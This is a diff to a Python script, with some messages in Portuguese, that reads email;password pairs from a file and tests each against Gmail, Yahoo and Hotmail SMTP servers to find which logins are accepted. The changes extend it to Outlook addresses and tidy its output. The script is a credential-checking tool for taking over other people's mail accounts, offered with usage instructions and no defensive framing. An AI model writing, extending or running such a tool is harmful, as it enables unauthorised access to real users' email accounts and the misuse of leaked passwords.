@@ -5,8 +5,8 @@
 # style from lines in file to read
 # e.g:
 # 	  filename.txt
-#		email1@gmail.com;password1
-#		email1@yahoo.com;password2
+#		email1@gmail.com;senha1
+#		email1@yahoo.com;senha2
 #		continue...
 #
 # Usage: python scriptname.py filename.txt
@@ -27,7 +27,7 @@ def login(s,mail,passwd):
 		elif e[0] == 535:
 			sys.stdout.write('\r[-] Erro : Mail[%s] and Password[%s] not accepted !'%(mail,passwd))
 		else:
-			sys.stdout.write('\r[-]Undetermined Error !')
+			sys.stdout.write('\r[-]Undetermined Error ! 											')
 
 	s.quit()
 
@@ -41,10 +41,11 @@ for l in open(sys.argv[1]):
 	elif ("@yahoo." in mail):
 		s = smtplib.SMTP(smtp_servers[1])
 		login(s,mail,passwd)
-	elif ("@hotmail." in mail) or ("@live." in mail):
+	elif ("@hotmail." in mail) or ("@live." in mail) or ("@outlook." in mail):
 		s = smtplib.SMTP(smtp_servers[2])	
 		login(s,mail,passwd)
 	else:
-		sys.stdout.write('\rUnlisted mail server [%s] !'%mail)
+		sys.stdout.write('\rUnlisted mail server [%s] ! 											'%mail)
 		pass
 	
+sys.stdout.write('\n[_] End Of Process !')
